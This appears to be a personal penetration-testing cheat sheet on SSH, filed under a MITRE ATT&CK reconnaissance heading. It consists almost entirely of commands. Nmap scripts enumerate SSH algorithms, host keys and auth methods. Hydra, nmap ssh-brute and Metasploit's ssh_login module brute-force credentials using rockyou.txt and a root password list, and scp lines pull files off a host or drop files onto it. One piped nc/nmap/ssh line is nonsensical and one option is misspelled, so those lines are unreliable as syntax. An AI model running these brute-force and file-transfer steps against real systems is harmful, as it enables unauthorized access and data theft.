[[content/Mitre Attack/Reconnaissance TA0043/ENUMERATION]]

scan:
	```
	nmap -p 22 --script ssh2-enum-algos
	nc IP PORT | nmap -sV -p 22 --script banner | ssh root@172.20.10.1 //banner 
	nmap -p 22 --script ssh-hostkey --script-args ssh-host.key=full <IP>
	nmap -p 22 --script ssh-auth-methods --script-args ssh.user='*'
	```

bruteforce:
Credential Access: https://attack.mitre.org/techniques/T1110
`~# hydra -t 4 -L user.txt -P rockyou.txt x.x.x.x ssh
`~# nmap -p 22 --script ssh-brute --script-args userdb=/home/adolf/user.txt x.x.x.x
`~# msfconsole -q
	`msf5> use auxiliary/scanner/ssh/ssh_enumusers
	`msf5> use auxiliary/scanner/ssh/ssh_login
		`msf5> set rhost
		`msf5> set userpass_file /usr/share/wordlist/metasploit/root_userpass.txt
		`msf5> set STOP_ON_SUCCESS true
		`msf5> set verbos ture

Transferfile:
	`~# scp username@hostname:'/path/to/file' .// get file
	`~# scp file username@hostname:'C:\Users\share' // drop file